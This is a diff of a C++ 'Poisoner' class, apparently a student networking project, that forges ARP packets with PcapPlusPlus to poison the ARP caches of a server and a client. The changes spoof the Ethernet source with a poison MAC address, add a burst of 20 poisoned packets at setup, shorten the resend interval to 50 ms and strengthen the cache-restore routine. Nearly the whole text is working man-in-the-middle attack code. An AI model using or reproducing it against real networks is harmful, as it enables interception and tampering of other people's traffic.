@@ -6,7 +6,7 @@
 /*   By: hoannguy <hoannguy@student.42lausanne.c    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/07/07 23:23:41 by hoannguy          #+#    #+#             */
-/*   Updated: 2026/07/09 11:43:04 by hoannguy         ###   ########.fr       */
+/*   Updated: 2026/07/10 15:31:44 by hoannguy         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -38,13 +38,23 @@ pcpp::Packet Poisoner::create_packet(
 	pcpp::IPv4Address i_src,
 	pcpp::IPv4Address i_dest
 ) {
-	pcpp::EthLayer *ethernetLayer = new pcpp::EthLayer(m_src, m_dest);
-	pcpp::ArpLayer *arpLayer = new pcpp::ArpLayer(pcpp::ArpReply(m_src, i_src, m_dest, i_dest));
+	pcpp::EthLayer *ethernetLayer = new pcpp::EthLayer(this->poison_mac, m_dest);
+	pcpp::ArpLayer *arpLayer = new pcpp::ArpLayer(pcpp::ArpRequest(m_src, i_src, i_dest));
 	pcpp::Packet newPacket(100);
 	newPacket.addLayer(ethernetLayer, true);
 	newPacket.addLayer(arpLayer, true);
 	newPacket.computeCalculateFields();
 	return newPacket;
+}
+
+void Poisoner::setup() {
+	for (int i = 0; i < 20; i++) {
+		if (!this->device->sendPacket(&this->poisoned_server_packet))
+            throw std::runtime_error("Failed to send poison to server");
+        if (!this->device->sendPacket(&this->poisoned_client_packet))
+            throw std::runtime_error("Failed to send poison to client");
+		std::this_thread::sleep_for(std::chrono::milliseconds(50));
+	}
 }
 
 void Poisoner::poison() {
@@ -53,7 +63,7 @@ void Poisoner::poison() {
             throw std::runtime_error("Failed to send poison to server");
         if (!this->device->sendPacket(&this->poisoned_client_packet))
             throw std::runtime_error("Failed to send poison to client");
-		std::this_thread::sleep_for(std::chrono::seconds(5));
+		std::this_thread::sleep_for(std::chrono::milliseconds(50));
 	}
 }
 
@@ -62,12 +72,12 @@ void Poisoner::stop_poison() {
 }
 
 void Poisoner::restore() {
-	int tries = 3;
+	int tries = 20;
 	for (int i = 0; i < tries; i++) {
 		if (!this->device->sendPacket(&this->good_server_packet))
             throw std::runtime_error("Failed to send restore to server");
         if (!this->device->sendPacket(&this->good_client_packet))
             throw std::runtime_error("Failed to send restore to client");
-		std::this_thread::sleep_for(std::chrono::seconds(1));
+		std::this_thread::sleep_for(std::chrono::milliseconds(50));
 	}
 }
